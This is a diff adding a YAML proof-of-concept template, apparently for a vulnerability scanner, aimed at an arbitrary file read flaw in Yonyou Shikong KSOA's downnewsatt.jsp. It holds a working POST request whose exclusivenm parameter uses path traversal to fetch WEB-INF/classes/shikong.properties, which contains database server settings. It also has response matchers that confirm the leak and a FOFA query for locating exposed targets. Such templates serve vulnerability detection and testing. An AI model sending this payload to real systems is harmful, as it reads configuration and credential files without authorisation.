@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-ksoa-downnewsatt-jsp-anyfile-read
+info:
+  name: 用友时空KSOA downnewsatt.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友时空KSOA
+  fofa: app="用友-时空KSOA"
+requests:
+- method: POST
+  path: /newspublish/downnewsatt.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: exclusivenm=../../WEB-INF/classes/shikong.properties
+  expression: 'status_code == 200 &&
+
+    contains(body,"debug=") &&
+
+    contains(body,"server.dbserver=") &&
+
+    !contains(body,"<") &&
+
+    contains(headers,"filename=") &&
+
+    contains(content_type,"application/x-msdownload")
+
+    '
+variables: {}
+transport: http
